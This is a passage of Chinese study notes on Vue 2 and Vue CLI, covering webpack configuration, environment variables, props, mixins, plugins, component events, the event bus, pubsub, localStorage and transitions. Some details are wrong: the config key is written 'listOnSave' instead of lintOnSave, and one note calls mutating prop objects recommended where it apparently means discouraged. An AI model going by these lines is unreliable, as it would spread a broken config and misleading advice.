  - `<% expression %>` 用来描述 JavaScript 流程控制。

  除了[被 `html-webpack-plugin` 暴露的默认值](https://github.com/jantimon/html-webpack-plugin#writing-your-own-templates)之外，所有[客户端环境变量](https://cli.vuejs.org/zh/guide/mode-and-env.html#using-env-variables-in-client-side-code)也可以直接使用。例如，`BASE_URL` 的用法：

  ```html
  <link rel="icon" href="<%= BASE_URL %>favicon.ico">
  ```

- 多页应用：不是每个应用都需要是一个单页应用。Vue CLI 支持使用 [`vue.config.js` 中的 `pages` 选项](https://cli.vuejs.org/zh/config/#pages)构建一个多页面的应用。构建好的应用将会在不同的入口之间高效共享通用的 chunk 以获得最佳的加载性能。

- 处理静态资源：静态资源可以通过两种方式进行处理

  - 在 JavaScript 被导入或在 template/CSS 中通过相对路径被引用。这类引用会被 webpack 处理。
  - 放置在 `public` 目录下或通过绝对路径被引用。这类资源将会直接被拷贝，而不会经过 webpack 的处理。

- **从相对路径引入**：当你在 JavaScript、CSS 或 `*.vue` 文件中使用相对路径 (必须以 `.` 开头) 引用一个静态资源时，该资源将会被包含进入 webpack 的依赖图中。在其编译过程中，所有诸如 `<img src="...">`、`background: url(...)` 和 CSS `@import` 的资源 URL **都会被解析为一个模块依赖**。

  

  ![image-20230306104715154](https://gitee.com/dorothea817/pics/raw/master/image-20230306104715154.png)

- URL 转换规则：

  - 如果 URL 是一个绝对路径 (例如 `/images/foo.png`)，它将会被保留不变。
  - 如果 URL 以 `.` 开头，它会作为一个相对模块请求被解释且基于你的文件系统中的目录结构进行解析。
  - 如果 URL 以 `~` 开头，其后的任何内容都会作为一个模块请求被解析。这意味着你甚至可以引用 Node 模块中的资源：`<img src="~some-npm-package/foo.png">`
  - 如果 URL 以 `@` 开头，它也会作为一个模块请求被解析。它的用处在于 Vue CLI 默认会设置一个指向 `<projectRoot>/src` 的别名 `@`。**(仅作用于模版中)**

- public文件夹：任何放置在 `public` 文件夹的静态资源都会被简单的复制，而**不经过 webpack**。你需要通过**绝对路径来引用**它们。推荐使用**相对路径**引入，将资源作为你的模块依赖图的一部分导入，这样它们会通过 webpack 的处理。好处为：

  - 脚本和样式表会被压缩且打包在一起，从而**避免额外的网络请求**。
  - 文件丢失会直接在**编译时报错**，而不是到了用户端才产生 404 错误。
  - 最终生成的文件名包含了内容哈希，因此你**不必担心浏览器会缓存它们的老版本**。

- 使用public文件夹的时机：

  - 你需要在构建输出中**指定一个文件的名字**。
  - 你有上千个图片，需要**动态引用它们的路径**。
  - **有些库可能和 webpack 不兼容**，这时你除了将其用一个独立的 `<script>` 标签引入没有别的选择。

**配置webpack**

调整 webpack 配置最简单的方式就是在 `vue.config.js` 中的 `configureWebpack` 选项提供一个对象：该对象将会被 [webpack-merge](https://github.com/survivejs/webpack-merge) 合并入最终的 webpack 配置。

```js
// vue.config.js
module.exports = {
  configureWebpack: {
    plugins: [
      new MyAwesomeWebpackPlugin()
    ]
  }
}
```

- **模式**：默认情况下，一个 Vue CLI 项目有三个模式：

  - `development` 模式用于 `vue-cli-service serve`
  - `test` 模式用于 `vue-cli-service test:unit`
  - `production` 模式用于 `vue-cli-service build` 和 `vue-cli-service test:e2e`

- 可以通过传递 `--mode` 选项参数为命令行覆写默认的模式。例如，如果你想要在构建命令中使用开发环境变量：

  ```sh
  vue-cli-service build --mode development
  ```

  当运行 `vue-cli-service` 命令时，所有的环境变量都从对应的[环境文件](https://cli.vuejs.org/zh/guide/mode-and-env.html#环境变量)中载入。如果文件内部不包含 `NODE_ENV` 变量，它的值将取决于模式，例如，在 `production` 模式下被设置为 `"production"`，在 `test` 模式下被设置为 `"test"`，默认则是 `"development"`。

  `NODE_ENV` 将决定您的应用运行的模式，是开发，生产还是测试，因此也决定了创建哪种 webpack 配置。

- **环境变量**：

  ```sh
  .env                # 在所有的环境中被载入
  .env.local          # 在所有的环境中被载入，但会被 git 忽略
  .env.[mode]         # 只在指定的模式中被载入
  .env.[mode].local   # 只在指定的模式中被载入，但会被 git 忽略
  ```

只有 `NODE_ENV`，`BASE_URL` 和以 `VUE_APP_` 开头的变量将通`webpack.DefinePlugin` 静态地嵌入到客户端侧的代码中。你可以在应用的代码中这样访问它们：

```js
console.log(process.env.VUE_APP_SECRET)
//在构建过程中，process.env.VUE_APP_SECRET 将会被相应的值所取代。在 VUE_APP_SECRET=secret 的情况下，它会被替换为 "secret"。
```

> 关于不同版本的Vue：
>
> 1.vue.js与vue.runtime.xxx.js的区别：
> (1).vue.js是完整版的Vue，包含：核心功能+模板解析器。
> (2).vue.runtime.xxx.js是运行版的Vue，只包含：核心功能；没有模板解析器。
>
> 2.因为vue.runtime.xxx.js没有模板解析器，所以不能使用template配置项，需要使用render函数接收到的createElement函数去指定具体内容。

**vue.config.js配置文件**：

1. 使用`vue inspect > output.js`可以查看到Vue脚手架的默认配置。

2. 使用vue.config.js可以对脚手架进行个性化定制，详情见：https://cli.vuejs.org/zh

   ```js
   //关闭语法检查
   module.exports = {
       listOnSave:false
   }
   ```

# 使用脚手架

## ref属性

> 1. 被用来给元素或子组件注册引用信息（id的替代者）
> 2. 应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象（vc）
> 3. 使用方式：
>    1. 打标识：```<h1 ref="xxx">.....</h1>``` 或 ```<School ref="xxx"></School>```
>    2. 获取：```this.$refs.xxx```

```vue
<template>
	<div>
		<h1 v-text="msg" ref="title"></h1>
		<button ref="btn" @click="showDOM">点我输出上方的DOM元素</button>
		<School ref="sch"/>
	</div>
</template>

<script>
	//引入School组件
	import School from './components/School'

	export default {
		name:'App',
		components:{School},
		data() {
			return {
				msg:'欢迎学习Vue！'
			}
		},
		methods: {
			showDOM(){
				console.log(this.$refs.title) //真实DOM元素
				console.log(this.$refs.btn) //真实DOM元素
				console.log(this.$refs.sch) //School组件的实例对象（vc）
			}
		},
	}
</script>
```

## props配置项

1. 功能：让组件接收外部传过来的数据

2. 传递数据：```<Demo name="xxx"/>```

3. 接收数据：

   1. 第一种方式（只接收）：```props:['name'] ```

   2. 第二种方式（限制类型）：```props:{name:String}```

   3. 第三种方式（限制类型、限制必要性、指定默认值）：

      ```js
      props:{
      	name:{
      	type:String, //类型
      	required:true, //必要性
      	default:'老王' //默认值
      	}
      }
      ```

   > 备注：props是只读的，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据。

```vue
<template>
	<div>
		<h1>{{msg}}</h1>
		<h2>学生姓名：{{name}}</h2>
		<h2>学生性别：{{sex}}</h2>
		<h2>学生年龄：{{myAge+1}}</h2>
		<button @click="updateAge">尝试修改收到的年龄</button>
	</div>
</template>

<script>
	export default {
		name:'Student',
		data() {
			console.log(this)
			return {
				msg:'我是一个尚硅谷的学生',
				myAge:this.age
			}
		},
		methods: {
			updateAge(){
				this.myAge++
			}
		},
		//简单声明接收
		// props:['name','age','sex'] 

		//接收的同时对数据进行类型限制
		/* props:{
			name:String,
			age:Number,
			sex:String
		} */

		//接收的同时对数据：进行类型限制+默认值的指定+必要性的限制
		props:{
			name:{
				type:String, //name的类型是字符串
				required:true, //name是必要的
			},
			age:{
				type:Number,
				default:99 //默认值
			},
			sex:{
				type:String,
				required:true
			}
		}
	}
</script>
```

## mixin(混入)

1. 功能：可以把多个组件**共用的配置提取成一个混入对象**

2. 使用方式：

   第一步定义混合：

   ```
   {
       data(){....},
       methods:{....}
       ....
   }
   ```

   第二步使用混入：

   ​	全局混入：```Vue.mixin(xxx)```
   ​	局部混入：```mixins:['xxx']	```

   ```js
   //mixin.js
   export const hunhe = {
   	methods: {
   		showName(){
   			alert(this.name)
   		}
   	},
   	mounted() {
   		console.log('你好啊！')
   	},
   }
   export const hunhe2 = {
   	data() {
   		return {
   			x:100,
   			y:200
   		}
   	},
   }
   
   //使用 （局部）
   export default {
       name:'Student',
       data() {
           return {
               name:'张三',
               sex:'男'
           }
       },
       mixins:[hunhe,hunhe2]
   }
   //使用 （全局）
   import Vue from 'vue'
   import App from './App.vue'
   import {hunhe,hunhe2} from './mixin'
   Vue.config.productionTip = false
   
   Vue.mixin(hunhe)
   Vue.mixin(hunhe2)
   
   new Vue({
   	el:'#app',
   	render: h => h(App)
   })
   ```

3. 注意：

   当混入中有和原组件**重复的配置**时，以**原组件为准**，若有相同的**生命周期函数**，则均采用，且**混入中的先被调用**。

## 插件

1. 功能：用于增强Vue

2. 本质：包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据。

3. 定义插件：

   ```js
   //plugins.js
   export default {
   	install(Vue,options){
   		console.log(options)
   		//全局过滤器
   		Vue.filter('mySlice',function(value){
   			return value.slice(0,4)
   		})
   
   		//定义全局指令
   		Vue.directive('fbind',{
   			//指令与元素成功绑定时（一上来）
   			bind(element,binding){
   				element.value = binding.value
   			},
   			//指令所在元素被插入页面时
   			inserted(element,binding){
   				element.focus()
   			},
   			//指令所在的模板被重新解析时
   			update(element,binding){
   				element.value = binding.value
   			}
   		})
   
   		//定义混入
   		Vue.mixin({
   			data() {
   				return {
   					x:100,
   					y:200
   				}
   			},
   		})
   
   		//给Vue原型上添加一个方法（vm和vc就都能用了）
   		Vue.prototype.hello = ()=>{alert('你好啊')}
   	}
   }
   ```

4. 使用插件：```Vue.use(plugins,options)```

## scoped样式

1. 作用：让样式在局部生效，防止冲突。

2. 注意：如果没有写scoped，后引入的样式会覆盖前面引入的同名样式

3. 写法：```<style scoped>```

   ```css
   <style scoped>
   	.demo{
   		background-color: skyblue;
   	}
   </style>
   ```

## 总结TodoList案例

1. 组件化编码流程：

   ​	(1).拆分静态组件：组件要按照**功能点拆分**，命名不要与html元素冲突。

   ​	(2).实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用：

   ​			1).一个组件在用：放在组件自身即可。

   ​			2). 一些组件在用：放在他们共同的父组件上（<span style="color:red">状态提升</span>）。

   ​	(3).实现交互：从绑定事件开始。

2. props适用于：

   ​	(1).父组件 ==> 子组件 通信

   ​	(2).子组件 ==> 父组件 通信（要求父先给子一个函数）

3. 使用v-model时要切记：v-model绑定的值不能是props传过来的值，因为**props是不可以修改**的！

4. props传过来的若是**对象类型的值**（深层数据 ），修改对象中的属性时Vue不会报错，但推荐这样做。

## 浏览器本地存储

1. 存储内容大小一般支持5MB左右（不同浏览器可能还不一样）

2. 浏览器端通过 Window.sessionStorage 和 Window.localStorage 属性来实现本地存储机制。

3. 相关API：

   1. ```xxxxxStorage.setItem('key', 'value');```
      	该方法接受一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值。

   2. ```xxxxxStorage.getItem('person');```

      ​		该方法接受一个键名作为参数，返回键名对应的值。

   3. ```xxxxxStorage.removeItem('key');```

      ​		该方法接受一个键名作为参数，并把该键名从存储中删除。

   4. ``` xxxxxStorage.clear()```

      ​		该方法会清空存储中的所有数据。

4. 备注：

   1. SessionStorage存储的内容会随着浏览器窗口关闭而消失。
   2. LocalStorage存储的内容，需要手动清除才会消失。
   3. ```xxxxxStorage.getItem(xxx)```如果xxx对应的value获取不到，那么getItem的返回值是null。
   4. ```JSON.parse(null)```的结果依然是null。

## 组件的自定义事件

1. 一种组件间通信的方式，适用于：<strong style="color:red">子组件 ===> 父组件</strong>

2. 使用场景：A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（<span style="color:red">事件的回调在A中</span>）。

3. 绑定自定义事件：

   1. 第一种方式，在父组件中：```<Demo @atguigu="test"/>```  或 ```<Demo v-on:atguigu="test"/>```

   2. 第二种方式，在父组件中：

      ```js
      <Demo ref="demo"/>
      ......
      mounted(){
         this.$refs.xxx.$on('atguigu',this.test)
      }
      ```

   3. 若想让自定义事件只能触发一次，可以使用```once```修饰符，或```$once```方法。

4. 触发自定义事件：```this.$emit('atguigu',数据)```		

5. 解绑自定义事件```this.$off('atguigu')```

6. 组件上也可以绑定原生DOM事件，需要使用```native```修饰符。

7. 注意：通过```this.$refs.xxx.$on('atguigu',回调)```绑定自定义事件时，回调<span style="color:red">要么配置在methods中</span>，<span style="color:red">要么用箭头函数</span>，否则this指向会出问题！

## 全局事件总线（GlobalEventBus）

1. 一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。

2. 安装全局事件总线：

   ```js
   new Vue({
   	......
   	beforeCreate() {
   		Vue.prototype.$bus = this //安装全局事件总线，$bus就是当前应用的vm
   	},
       ......
   }) 
   ```

3. 使用事件总线：

   1. 接收数据：A组件想接收数据，则在A组件中给$bus绑定自定义事件，事件的<span style="color:red">回调留在A组件自身。</span>

      ```vue
      methods(){
        demo(data){......}
      }
      ......
      mounted() {
        this.$bus.$on('xxxx',this.demo)
      }
      ```

   2. 提供数据：```this.$bus.$emit('xxxx',数据)```

4. 最好在beforeDestroy钩子中，用$off去解绑<span style="color:red">当前组件所用到的</span>事件。

## 消息订阅与发布（pubsub）

1. 一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。

2. 使用步骤：

   1. 安装pubsub：```npm i pubsub-js```

   2. 引入: ```import pubsub from 'pubsub-js'```

   3. 接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的<span style="color:red">回调留在A组件自身。</span>

      ```js
      methods(){
        demo(data){......}
      }
      ......
      mounted() {
        this.pid = pubsub.subscribe('xxx',this.demo) //订阅消息
      }
      ```

   4. 提供数据：```pubsub.publish('xxx',数据)```

   5. 最好在beforeDestroy钩子中，用```PubSub.unsubscribe(pid)```去<span style="color:red">取消订阅。</span>

## nextTick

1. 语法：```this.$nextTick(回调函数)```
2. 作用：在下一次 DOM 更新结束后执行其指定的回调。
3. 什么时候用：当改变数据后，要基于更新后的新DOM进行某些操作时，要在nextTick所指定的回调函数中执行。

## Vue封装的过度与动画

1. 作用：在插入、更新或移除 DOM元素时，在合适的时候给元素添加样式类名。

2. 图示：![image-20230327205807035](https://gitee.com/dorothea817/pics/raw/master/image-20230327205807035.png)

3. 写法：

   1. 准备好样式：

      - 元素进入的样式：
        1. v-enter：进入的起点
        2. v-enter-active：进入过程中
        3. v-enter-to：进入的终点
      - 元素离开的样式：
        1. v-leave：离开的起点
        2. v-leave-active：离开过程中
        3. v-leave-to：离开的终点

   2. 使用```<transition>```包裹要过度的元素，并配置name属性：

      ```vue
      <transition name="hello">
      	<h1 v-show="isShow">你好啊！</h1>
      </transition>
      ```

   3. 备注：若有多个元素需要过度，则需要使用：```<transition-group>```，且每个元素都要指定```key```值。

4. 第三方动画插件库：[animate.css](https://animate.style/)

   ![image-20230327210419377](https://gitee.com/dorothea817/pics/raw/master/image-20230327210419377.png)

   1. 下载：`npm install animate.css`

   2. 使用：

      ```html
      <h1 class="animate__animated animate__bounce" enter-active-class='animate__wobble' leave-active-class='animate__backOutDown'>An animated element</h1>
      ```

      
